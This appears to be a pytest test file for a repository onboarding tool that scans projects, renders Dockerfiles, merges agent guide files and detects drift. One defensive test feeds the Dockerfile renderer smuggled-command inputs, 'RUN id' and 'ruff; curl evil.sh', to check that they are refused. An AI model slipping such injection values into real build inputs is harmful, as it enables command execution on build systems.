"""Tests for v0.4.0 dynamic brownfield onboarding (scanner, Readiness Gate, emitter, security, and drift)."""
from __future__ import annotations

import json
import pathlib
import subprocess
import sys

import pytest
import yaml

from scripts.lib.budget_engine import check_context_budget
from scripts.lib.dockerfile_recipes import render_conditional_dockerfile
from scripts.lib.onboard_emitter import END_MARKER, START_MARKER, check_readiness, emit_layer3_overlay
from scripts.lib.onboard_scanner import detect_repo_drift, scan_repository_facts
from scripts.lib.schema_validator import validate_yaml_file

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
PROFILE_SCHEMA = REPO_ROOT / "schemas/factory-profile.schema.json"
HUB_PROJECT_SCHEMA = REPO_ROOT / "schemas/hub-project.schema.json"
GECX_TOOLCHAIN = REPO_ROOT / "packs/gecx/toolchain-manifest.json"


def _make_brownfield_repo(root: pathlib.Path) -> pathlib.Path:
    """Creates a realistic brownfield repository with Poetry, Ruff, Node/ESLint/Playwright, and AI docs."""
    root.mkdir(parents=True, exist_ok=True)
    (root / "pyproject.toml").write_text(
        "[tool.poetry]\nname = 'billing-bot'\n[tool.ruff]\nline-length = 100\n",
        encoding="utf-8",
    )
    (root / "package.json").write_text(
        json.dumps({"devDependencies": {"playwright": "^1.50.0", "eslint": "^9.0.0"}, "scripts": {"test": "playwright test"}}),
        encoding="utf-8",
    )
    (root / "AGENTS.md").write_text("# Existing Team Rules\r\nNever force-push to develop.\r\n", encoding="utf-8")
    (root / "CLAUDE.md").write_text("# Existing Claude Guide\nKeep PRs small.\n", encoding="utf-8")
    (root / ".cursorrules").write_text("Use strict typing.\n", encoding="utf-8")
    (root / ".git").mkdir()
    (root / ".git" / "HEAD").write_text("ref: refs/heads/develop\n", encoding="utf-8")
    (root / "docs" / "adr").mkdir(parents=True)
    (root / "docs" / "adr" / "001-arch.md").write_text("# ADR 001\n", encoding="utf-8")
    return root


def _base_profile(scan: dict, track: str = "express") -> dict:
    """Builds a valid onboarding profile from static scanner output."""
    prof = {
        "schema_version": "1",
        "slug": "billing-bot",
        "pack": "gecx",
        "pack_version": "0.4.0",
        "track": track,
        "existing_hub": True,
        "mode": "sandbox-direct",
        "diversity_profile": "cross-model",
        "autonomy": "supervised",
        "git_flow": {
            "base_branch": scan["git_flow"]["base_branch"],
            "branch_pattern": "feat/<issue>-<slug>",
            "commit_convention": "conventional-commits",
            "ci_platform": scan["git_flow"]["ci_platform"],
            "pr_template": scan["git_flow"]["pr_template"],
            "workflows": scan["git_flow"]["workflows"],
        },
        "commands": scan["commands"],
        "detected_binaries": scan["detected_binaries"],
        "missing_binaries": scan["missing_binaries"],
        "heavy_test_binaries": scan["heavy_test_binaries"],
        "ai_files_detected": scan["ai_files_detected"],
        "knowledge_sources": scan["knowledge_sources"],
        "modernization_gaps": scan["modernization_gaps"],
    }
    if track == "complete":
        prof.update({
            "mission": "Automate billing support triage with deterministic audit trails.",
            "non_goals": ["No direct core banking ledger mutations."],
            "requirements": [
                {
                    "id": "REQ-001",
                    "summary": "Respond to invoice lookup within 5 seconds.",
                    "acceptance_criteria": ["Synthetic eval suite passes with 0 failures."],
                }
            ],
            "invariants": ["Never log customer tax identifiers in stdout or traces."],
            "evaluation_pyramid": {"l1_offline": "pytest -q", "l2_sandbox": "gecx_sandbox_gate.py"},
        })
    return prof


def test_brownfield_scanner_detects_six_dimensions_and_toolchain_delta(tmp_path: pathlib.Path) -> None:
    """Confirms scan_repository_facts detects binaries, heavy testers, AI files, git branch, and docs."""
    repo = _make_brownfield_repo(tmp_path / "bf")
    scan = scan_repository_facts(repo, GECX_TOOLCHAIN)

    assert "python" in scan["stacks"] and "node" in scan["stacks"]
    assert {"poetry", "ruff", "node", "eslint"}.issubset(set(scan["missing_binaries"]))
    assert "playwright-node" in scan["heavy_test_binaries"]
    assert "playwright-node" not in scan["missing_binaries"]
    assert scan["git_flow"]["base_branch"] == "develop"
    assert {"AGENTS.md", "CLAUDE.md", ".cursorrules"}.issubset(set(scan["ai_files_detected"]))
    assert "docs/adr/001-arch.md" in scan["knowledge_sources"]


def test_dockerfile_recipes_topological_order_and_injection_refusal() -> None:
    """Negative + ordering test (OB-02/OB-03): node precedes eslint, non-digest image and unknown binary fail."""
    img = "us-central1-docker.pkg.dev/demo/repo/gecx-runtime@sha256:" + ("a" * 64)
    df = render_conditional_dockerfile(img, ["eslint", "node", "ruff"])
    assert df is not None
    assert f"\nFROM {img}\n" in df
    assert df.index("nodejs") < df.index("eslint")
    assert "USER root" in df and "USER scion" in df
    assert "RUN echo" not in df

    with pytest.raises(ValueError, match="digest-pinned"):
        render_conditional_dockerfile("gecx-runtime:latest\nRUN id", ["ruff"])

    with pytest.raises(ValueError, match="Unsupported binary"):
        render_conditional_dockerfile(img, ["ruff; curl evil.sh"])


def test_emitter_preserves_crlf_parity_merges_non_destructively_and_tracks_day2_drift(tmp_path: pathlib.Path) -> None:
    """Confirms emitter handles CRLF, non-destructive hub-project/backlog merge, Vertex routing, and Day-2 drift."""
    repo = _make_brownfield_repo(tmp_path / "bf")
    scan = scan_repository_facts(repo, GECX_TOOLCHAIN)
    profile = _base_profile(scan, track="complete")
    image_ref = "us-central1-docker.pkg.dev/demo/repo/gecx-runtime@sha256:" + ("a" * 64)

    res1 = emit_layer3_overlay(repo, profile, image_ref, PROFILE_SCHEMA)
    assert res1["custom_dockerfile"] == ".factory/Dockerfile.customer"
    assert res1["tester_dockerfile"] == ".factory/Dockerfile.customer-tester"
    tester_df = (repo / ".factory" / "Dockerfile.customer-tester").read_text(encoding="utf-8")
    assert "PLAYWRIGHT_BROWSERS_PATH=/opt/playwright-browsers" in tester_df

    # Existing CRLF prose in AGENTS.md stays CRLF and CLAUDE.md preserves customer prose + marker-delimited @AGENTS.md bridge (BG-H6).
    agents_bytes = (repo / "AGENTS.md").read_bytes()
    assert b"\r\n" in agents_bytes
    assert START_MARKER.encode() in agents_bytes and END_MARKER.encode() in agents_bytes
    claude_txt = (repo / "CLAUDE.md").read_text(encoding="utf-8")
    assert claude_txt.startswith("# Existing Claude Guide\nKeep PRs small.\n")
    assert "@AGENTS.md" in claude_txt and START_MARKER in claude_txt and END_MARKER in claude_txt

    # Cross-model preset uses Scion generic tier aliases on Antigravity Vertex AI without hardcoded model versions.
    hub_proj = repo / ".factory" / "hub-project.yaml"
    assert validate_yaml_file(hub_proj, HUB_PROJECT_SCHEMA) == []
    hp = yaml.safe_load(hub_proj.read_text(encoding="utf-8"))
    assert hp["harnesses"]["claude_model_garden_enabled"] is False
    assert hp["model_routing"]["developer"]["model"] == "extra-large"
    assert hp["model_routing"]["code-reviewer"]["model"] == "large"

    # Re-emit preserves user's exclude_skills and marked-done modernization backlog items.
    hp["exclude_skills"] = ["gecx-domain-guardrails"]
    hub_proj.write_text(yaml.safe_dump(hp, sort_keys=False), encoding="utf-8")
    bl_path = repo / ".factory" / "modernization-backlog.yaml"
    bl = yaml.safe_load(bl_path.read_text(encoding="utf-8"))
    bl["gaps"][0]["status"] = "done"
    bl_path.write_text(yaml.safe_dump(bl, sort_keys=False), encoding="utf-8")

    emit_layer3_overlay(repo, profile, image_ref, PROFILE_SCHEMA)
    assert yaml.safe_load(hub_proj.read_text(encoding="utf-8"))["exclude_skills"] == ["gecx-domain-guardrails"]
    assert yaml.safe_load(bl_path.read_text(encoding="utf-8"))["gaps"][0]["status"] == "done"

    budget_errs, _ = check_context_budget(REPO_ROOT, REPO_ROOT / "packs/gecx", hub_proj)
    assert budget_errs == []

    # Immediately after onboarding, Day-2 drift MUST be False (missing_binaries already covered by Dockerfile.customer).
    assert detect_repo_drift(repo, GECX_TOOLCHAIN)["drift_detected"] is False

    # Adding a new Go stack or CI workflow triggers Day-2 drift.
    (repo / "go.mod").write_text("module example.com/billing\n", encoding="utf-8")
    drift = detect_repo_drift(repo, GECX_TOOLCHAIN)
    assert drift["drift_detected"] is True
    assert "go" in drift["missing_binaries"]


def test_emitter_refuses_orphan_markers_and_preserves_scaffold_sibling_parity(tmp_path: pathlib.Path) -> None:
    """Negative + parity test (OB-06/OB-07): orphan marker aborts atomically; byte-identical siblings stay in sync."""
    image_ref = "us-central1-docker.pkg.dev/demo/repo/gecx-runtime@sha256:" + ("b" * 64)

    # 1. Orphan start marker must fail atomically without writing .factory/hub-project.yaml.
    broken = tmp_path / "orphan"
    broken.mkdir()
    (broken / "AGENTS.md").write_text(f"# Rules\n{START_MARKER}\nno end marker\n", encoding="utf-8")
    prof = _base_profile(scan_repository_facts(broken, GECX_TOOLCHAIN))
    prof["commands"]["lint"] = "ruff check ."
    with pytest.raises(ValueError, match="malformed factory markers"):
        emit_layer3_overlay(broken, prof, image_ref, PROFILE_SCHEMA)
    assert not (broken / ".factory" / "hub-project.yaml").exists()

    # 2. Byte-identical AGENTS/CLAUDE/GEMINI scaffold stays byte-identical after emit.
    parity_repo = tmp_path / "parity"
    parity_repo.mkdir()
    for fname in ("AGENTS.md", "CLAUDE.md", "GEMINI.md"):
        (parity_repo / fname).write_text("# Shared Contract\n", encoding="utf-8")
    p2 = _base_profile(scan_repository_facts(parity_repo, GECX_TOOLCHAIN))
    p2["commands"]["lint"] = "ruff check ."
    emit_layer3_overlay(parity_repo, p2, image_ref, PROFILE_SCHEMA)
    assert (parity_repo / "AGENTS.md").read_bytes() == (parity_repo / "CLAUDE.md").read_bytes()
    assert (parity_repo / "AGENTS.md").read_bytes() == (parity_repo / "GEMINI.md").read_bytes()


def test_factory_onboard_cli_supports_json_flag_on_all_subcommands(tmp_path: pathlib.Path) -> None:
    """Confirms factory_onboard.py scan --json and check --json work via CLI."""
    repo = _make_brownfield_repo(tmp_path / "cli-repo")
    res = subprocess.run(
        [
            sys.executable,
            str(REPO_ROOT / "core-gcp-fde/scripts/factory_onboard.py"),
            "scan",
            "--repo",
            str(repo),
            "--toolchain-manifest",
            str(GECX_TOOLCHAIN),
            "--json",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    assert res.returncode == 0, res.stderr
    scan = json.loads(res.stdout)
    prof_path = tmp_path / "profile.yaml"
    prof_path.write_text(yaml.safe_dump(_base_profile(scan, track="express")), encoding="utf-8")

    res_chk = subprocess.run(
        [
            sys.executable,
            str(REPO_ROOT / "core-gcp-fde/scripts/factory_onboard.py"),
            "check",
            "--profile",
            str(prof_path),
            "--json",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    assert res_chk.returncode == 0, res_chk.stderr
    assert json.loads(res_chk.stdout)["ready"] is True


def test_model_routing_fail_closed_and_drift_note_truncation(tmp_path: pathlib.Path) -> None:
    """Negative tests (B-05/B-07/B-08): cross-vendor without opt-in raises, drift notes stay <=200 chars."""
    from scripts.lib.model_routing import build_default_harnesses_and_routing

    with pytest.raises(ValueError, match="claude_model_garden_enabled"):
        build_default_harnesses_and_routing("cross-vendor")

    repo = _make_brownfield_repo(tmp_path / "long-wf")
    prof = _base_profile(scan_repository_facts(repo, GECX_TOOLCHAIN))
    emit_layer3_overlay(repo, prof, "us-central1-docker.pkg.dev/demo/repo/gecx-runtime@sha256:" + ("a" * 64), PROFILE_SCHEMA)

    wf_dir = repo / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    for idx in range(12):
        (wf_dir / f"very-long-workflow-pipeline-definition-{idx:02d}.yml").write_text("name: ci\n", encoding="utf-8")
    drift = detect_repo_drift(repo, GECX_TOOLCHAIN)
    assert drift["drift_detected"] is True
    assert all(len(note) <= 200 for note in drift["notes"])
